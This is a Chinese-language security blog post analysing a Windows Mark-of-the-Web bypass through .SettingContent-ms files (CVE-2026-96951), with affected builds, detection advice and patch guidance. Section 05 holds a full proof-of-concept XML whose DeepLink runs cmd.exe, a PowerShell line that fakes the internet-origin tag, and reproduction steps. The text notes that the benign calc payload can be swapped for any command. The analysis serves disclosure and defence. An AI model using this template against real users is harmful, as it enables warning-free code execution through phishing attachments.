#  双击即中招：一个连安全警告都没有的 Windows 漏洞，正遭黑客大规模利用  
原创 网络安全透视镜
                    网络安全透视镜  网络安全透视镜   2026-10-19 06:00  
  
本文看点  
  
01  
  
MOTW 标签失效的连锁反应  
  
02  
  
.SettingContent-ms 执行链路还原  
  
03  
  
未修复环境 PoC 与验证方法  
  
01  
  
OVERVIEW  
### 漏洞概述  
  
  
1.1 事实速览  
  
<table><thead><tr><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">项目</span></section></th><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">内容</span></section></th></tr></thead><tbody><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">CVE 编号</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">CVE-2026-96951</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">漏洞类型</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">安全功能绕过（微软官方分类）；根因被第三方分析归为 CWE-77 命令注入</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">影响组件</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">Windows Shell（MOTW 标记机制）</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">CVSS v3.1</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">8.8（High；微软评级 Important）</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">披露日期</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">2026 年 10 月 13 日（微软 10 月补丁日）</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">在野利用</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">已确认（微软确认；同日列入 CISA KEV 目录）</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">KEV 修复截止</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">2026 年 10 月 16 日</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">涉及文件类型</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">.SettingContent-ms（微软通告未点名文件类型，该结论来自公开安全研究与 PoC 验证）</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">利用条件</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">邮件 / 即时消息投递 + 受害者双击打开；攻击者无需权限</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">发现致谢</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">微软致谢名单包含 Anthropic 的 Claude（AI 辅助漏洞发现）</span></section></td></tr></tbody></table>  
  
2026 年 10 月 13 日，微软在当月补丁日中修复了 Windows Shell 安全功能绕过漏洞 CVE-2026-96951，并确认该漏洞  
   
已遭在野利用  
   
，同日被列入 CISA 已知可利用漏洞（KEV）目录。  
  
REFERENCE  
  
漏洞的作用机制为：Mark of the Web（MOTW）是 Windows 附加在外部来源文件上的安全标记，由于 .SettingContent-ms 文件扩展名未被 Windows 识别为危险类型，用户打开带有该标记的此类文件时  
   
不会弹出安全警告  
   
；钓鱼攻击者可通过邮件或即时消息投递特制文件并诱导用户打开，在无安全警告弹窗的情况下  
   
执行任意命令  
   
。  
  
1.2 事件时间线  
  
<table><thead><tr><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">时间</span></section></th><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">事件</span></section></th></tr></thead><tbody><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">2026-10-13</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">微软发布 10 月累积更新修复该漏洞（25H2/24H2/26H2 为 KB5127648，23H2 为 KB5126653）；同日列入 CISA KEV</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">2026-10-15</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">本机安装 KB5127648 / KB5127647 / KB5127690，系统 build 升至 26200.9711</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">2026-10-16</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">CISA KEV 修复截止日</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">2026-10-19</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">本机完成 PoC 构造与攻击链机制核验，本文成稿</span></section></td></tr></tbody></table>  
  
  
02  
  
PRINCIPLE  
### 漏洞原理分析  
  
  
2.1 MOTW：一张所有守卫都会检查的“标签”  
  
MOTW  
   
（Mark of the Web）是 Windows 附加在外部来源文件上的安全标记，以 NTFS 备用数据流（ADS）的形式存在于文件中，即 Zone.Identifier 流。其中   
ZoneId=3 表示文件来自互联网  
   
，ZoneId=4 表示来自受限站点；该标记只存在于 NTFS 卷上。  
  
MOTW 本身并不是防护机制，它只是一张标签。真正起防护作用的是读取这张标签的各方：  
   
SmartScreen 筛选器、Office 保护视图、Office 对互联网宏的阻止  
   
（2022 年起 Word、Excel、PowerPoint、Visio 默认开启）、Windows 11 的 Smart App Control，以及附件管理器的“打开文件 - 安全警告”对话框。  
  
这张标签一旦失效，上述机制会同时失去判断依据——这正是本漏洞的危害所在。  
  
「一个漏洞，关掉的不是一道门，而是整层依赖同一信任信号的防线。」  
  
2.2 .SettingContent-ms：一个“打开即执行”的文件类型  
  
.SettingContent-ms 是 Windows 设置面板（ImmersiveControlPanel）使用的 XML 配置文件。本机注册表核验（Windows 11 25H2，build 26200.9711）确认了它的  
   
处理链路  
   
：  
  
HKCR\.SettingContent-ms  
  
默认值指向 ProgID SettingContent，即该扩展名的打开动作由 SettingContent 类接管。  
  
SettingContent\Shell\Open\Command  
  
DelegateExecute = {0c194cb2-2959-4d14-8964-37fd3e48c32d}，打开命令委托给该 CLSID 对应的处理器执行。  
  
C:\Windows\ImmersiveControlPanel\SystemSettings.exe  
  
实际处理器进程。双击 .SettingContent-ms 文件时，由它负责解析文件内容并启动。  
  
关键在于，该文件格式自 Windows 10 引入之初就携带  
   
命令执行能力  
   
：XML 中的  
   
DeepLink  
   
元素可直接携带命令行。2018 年，SpecterOps 研究员 Matt Nelson 公开了针对该文件类型的研究《The Tale of SettingContent-ms Files》，公开 PoC 的核心结构为  
   
<DeepLink>%windir%\system32\cmd.exe /c calc.exe</DeepLink>  
   
。  
  
该问题当年被编号 CVE-2018-8414 并于 2018 年 8 月修复。也就是说，“用 .SettingContent-ms 执行命令”的能力与风险  
   
八年前就已公开  
   
，本漏洞新增的不是执行能力，而是让这次执行绕过 MOTW 警告的通道。  
  
2.3 漏洞本质：危险文件类型清单里的缺口  
  
由于 .SettingContent-ms 扩展名未被 Windows 识别为危险类型，用户打开带有 MOTW 标记的此类文件时，Shell 不会弹出安全警告，处理器直接启动，DeepLink 中的命令  
   
随之执行  
   
。  
  
攻击链可以概括为三步：攻击者构造携带恶意命令行的 .SettingContent-ms 文件；经邮件或即时消息投递，文件落地时获得 MOTW 标记；受害者双击打开，无任何警告，命令直接执行。  
  
需要并列呈现的信息是：  
   
微软官方通告并未点名具体文件类型  
   
（Automox 在其 10 月补丁分析中明确指出了这一点），“.SettingContent-ms”的结论来自公开安全研究与 PoC 验证；第三方漏洞数据库 Wiz 则将该漏洞的根因归为 CWE-77 命令注入，与微软“安全功能绕过”的分类视角不同。两者均为事实陈述，本文不做取舍结论。  
  
2026 年以来，Windows Shell 相关安全特性绕过漏洞已多次出现在在野利用中（CVE-2026-21510、CVE-2026-21513、CVE-2026-32202 等），本漏洞是该系列中的  
   
最新一例  
   
。  
  
  
03  
  
SCOPE  
### 影响范围  
  
  
按微软 MSRC 通告给出的影响版本与修复线，受影响系统（  
   
未安装 2026 年 10 月累积更新  
   
）包括：  
  
<table><thead><tr><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">产品</span></section></th><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">受影响版本（小于以下 build）</span></section></th></tr></thead><tbody><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">Windows 10 1607</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">10.0.14393.9612</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">Windows 10 1809</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">10.0.17763.9376</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">Windows 10 21H2</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">10.0.19044.7807</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">Windows 10 22H2</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">10.0.19045.7807</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">Windows 11 23H2</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">10.0.22631.7652</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">Windows 11 24H2</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">10.0.26100.9711</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">Windows 11 25H2</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">10.0.26200.9711</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">Windows 11 26H1</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">10.0.28000.3231</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">Windows 11 26H2</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">10.0.26300.9711</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">Windows Server 2012 R2</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">6.3.9600.23470</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">Windows Server 2016</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">10.0.14393.9612</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">Windows Server 2019</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">10.0.17763.9376</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">Windows Server 2022</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">10.0.20348.5761</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">Windows Server 2025</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">10.0.26100.33650</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">Outlook.com</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">20260925.100</span></section></td></tr></tbody></table>  
  
覆盖消费级 Windows 10/11 全代际、服务器 2012 R2 至 2025，以及 Outlook.com 网页端。利用向量为  
   
网络远程投递  
   
，攻击复杂度低，无需特权，但需要受害者配合打开文件。  
  
  
04  
  
VERIFICATION  
### 本地验证情况（如实说明）  
  
  
环境为 Windows 11 家庭中文版 25H2，版本 10.0.26200.9711，已于 2026 年 10 月 15 日安装 10 月累积更新 KB5127648（含服务堆栈更新 KB5127647 与 .NET 更新 KB5127690）。  
  
对照微软修复线“Windows 11 25H2 小于 10.0.26200.9711 受影响”，本机恰好处于修复版本——漏洞的核心行为“无警告直接执行”无法在本机直接演示。  
  
4.1 本机已完成的核验  
  
1  
PoC 构造：按 2018 年公开结构完成 .SettingContent-ms 攻击文件构造，payload 使用无害命令（写入标记文件 / 启动计算器）。  
  
2  
MOTW 附加验证：通过 NTFS 备用数据流为 PoC 附加 Zone.Identifier（ZoneId=3，模拟互联网来源），验证数据流写入成功（188 字节）；将文件复制到 Downloads 目录后，MOTW 标记随文件保留——与真实场景中浏览器 / 邮件客户端下载落地的行为一致。  
  
3  
处理器链核验：注册表确认 HKCR\.SettingContent-ms → SettingContent → DelegateExecute {0c194cb2-2959-4d14-8964-37fd3e48c32d} → C:\Windows\ImmersiveControlPanel\SystemSettings.exe。  
  
4  
补丁状态核验：Get-HotFix 确认 KB5127647 / KB5127648 / KB5127690 已于 2026-10-15 安装；WinSxS 组件存储中 appxmain 组件版本已由 26100.9278 替换为 26100.9711，与 10 月累积更新的组件版本一致。  
  
4.2 未在本机获得确定结论的项  
  
未修复系统的静默执行  
  
本机不满足版本条件，无法直接演示。该行为由漏洞机制与微软补丁说明推出（修复补丁的作用即是为带 MOTW 的该类型文件恢复安全警告），本文未在未修复系统上独立验证。  
  
“拒绝访问”现象未定论  
  
本机尝试通过 ShellExecute 启动带 MOTW 的 PoC 文件时返回“拒绝访问”，同时观察到 SystemSettings.exe 处理器进程被拉起。受当前会话环境限制，该现象的完整归因未做定论，不作为漏洞结论使用。  
  
读者若需完整复现，应在  
   
未安装 2026 年 10 月累积更新的机器  
   
（build 低于上表修复线）上按第 05 章的 PoC 操作。  
  
  
05  
  
POC  
### 验证 PoC  
  
  
5.1 PoC 文件  
  
以下为完整 PoC（无害 payload：启动计算器）。  
   
DeepLink 元素中的命令行即为最终执行的命令  
   
，可替换为任意命令：  
  
.  
.  
.  
xml  
  
<?xml version="1.0" encoding="UTF-8"?>  
  
<PCSettings>  
  
　<SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent">  
  
　　<ApplicationInformation>  
  
　　　<AppID>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel</AppID>  
  
　　　<DeepLink>%SystemRoot%\system32\cmd.exe /c calc.exe</DeepLink>  
  
　　　<Icon>%windir%\system32\control.exe</Icon>  
  
　　</ApplicationInformation>  
  
　　<SettingIdentity>  
  
　　　<PageID></PageID>  
  
　　　<HostID>{12B1697E-D3A0-4DBC-B568-CCF64A3F934D}</HostID>  
  
　　</SettingIdentity>  
  
　　<SettingInformation>  
  
　　　<Description>@shell32.dll,-4161</Description>  
  
　　　<Keywords>@shell32.dll,-4161</Keywords>  
  
　　</SettingInformation>  
  
　</SearchableContent>  
  
</PCSettings>  
  
将上述内容保存为 poc.SettingContent-ms。该结构源自 SpecterOps 2018 年公开的 PoC，文件类型与 2018 年 CVE-2018-8414 研究所披露的一致。  
  
5.2 模拟“来自互联网”（附加 MOTW）  
  
漏洞触发的前提是文件带有 MOTW 标记。  
   
真实场景中邮件客户端或浏览器下载会自动附加  
   
；手动构造时可用 PowerShell 写入 Zone.Identifier 数据流：  
  
.  
.  
.  
powershell  
  
# 模拟浏览器/邮件下载落地：附加 MOTW 标记（ZoneId=3 表示互联网来源）  
  
Set-Content -Path .\poc.SettingContent-ms -Stream Zone.Identifier -Value "[ZoneTransfer]`r`nZoneId=3`r`nHostUrl=https://example.com/poc.SettingContent-ms`r`n" -Encoding ASCII  
  
  
# 验证 MOTW 已附加  
  
Get-Item .\poc.SettingContent-ms -Stream Zone.Identifier  
  
5.3 复现步骤  
  
1  
在未修复系统（build 低于第 03 章对应修复线）上创建 poc.SettingContent-ms；  
  
2  
按 5.2 附加 MOTW 标记（或经邮件 / 浏览器真实下载获得）；  
  
3  
在文件资源管理器中双击打开该文件；  
  
4  
观察行为：无任何警告弹窗、计算器直接启动，即复现成功；若弹出“打开文件 - 安全警告”，说明系统已修复。  
  
5.4 预期结果对照  
  
<table><thead><tr><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">系统状态</span></section></th><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">双击后的行为</span></section></th></tr></thead><tbody><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">未修复（build 小于修复线）</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">无安全警告弹窗，命令直接执行（由漏洞机制与微软补丁说明推出，未独立验证）</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">已修复（build 大于等于修复线）</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">弹出“打开文件 - 安全警告”，命令不执行</span></section></td></tr></tbody></table>  
  
5.5 无害验证变体（脚本化验证）  
  
若需在无 GUI 的环境下验证，可将 DeepLink 替换为写入标记文件的命令，  
   
通过标记文件是否出现判断执行结果  
   
：  
  
.  
.  
.  
xml  
  
<DeepLink>%SystemRoot%\system32\cmd.exe /c echo CVE-2026-96951-PWNED>%TEMP%\cve-2026-96951_pwned.txt</DeepLink>  
  
执行成功后检查 %TEMP%\cve-2026-96951_pwned.txt 是否生成即可。  
  
5.6 检测建议  
  
端点侧  
  
监控 SystemSettings.exe / ImmersiveControlPanel 派生的子进程（Sysmon 事件 ID 1 或 Windows 安全日志 4688），正常情况下该处理器不应生成 cmd.exe、powershell.exe 等子进程，一旦出现即视为该文件类型被触发的强信号。  
  
静态侧  
  
对邮件附件与下载目录中出现的 .settingcontent-ms / .appcontent-ms 文件做提取与哈希比对，结合威胁情报平台核查样本。  
  
网络侧  
  
关注用户打开邮件附件后出现的异常外联。  
  
  
06  
  
MITIGATION  
### 修复方案  
  
  
6.1 官方补丁  
  
安装微软 2026 年 10 月累积更新：Windows 11 25H2 / 24H2 / 26H2 为 KB5127648，23H2 为 KB5126653，其余版本按 MSRC 通告（CVE-2026-96951）选择对应补丁。修复后打开带 MOTW 的 .SettingContent-ms 文件会  
   
弹出安全警告  
   
。官方通告地址：msrc.microsoft.com/update-guide/vulnerability/CVE-2026-96951。  
  
6.2 临时缓解措施  
  
在补丁部署完成前，可在防护设备上  
   
按扩展名拦截邮件、即时消息和网页下载的附件及压缩包内的 .settingcontent-ms 与 .appcontent-ms 文件  
   
。该措施直接切断投递通道，且不影响正常业务（正常场景极少通过邮件分发此类文件）。  
  
6.3 响应优先级  
  
该漏洞已遭在野利用且列入 CISA KEV（修复截止 2026 年 10 月 16 日），建议未打补丁的终端尽快完成更新；对截止日前已处理过可疑 .SettingContent-ms 附件的机器，应结合端点日志排查 SystemSettings.exe 的异常子进程。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS4ibIBPcmgJMLNXWIaCPcW54mVicYJkaOO1JQicEDBGCBM1P7IiaiablZ9tEUrP27FyvB9CZWl5SiaqhicDw/640?wx_fmt=png "")  
  
  
END  
  
我是 网络安全透视镜，专注网络与信息安全领域。  
  
如果你觉得今天这篇有收获，欢迎  
 **点赞、在看、转发**  
   
三连，我们下篇见。  
  
  
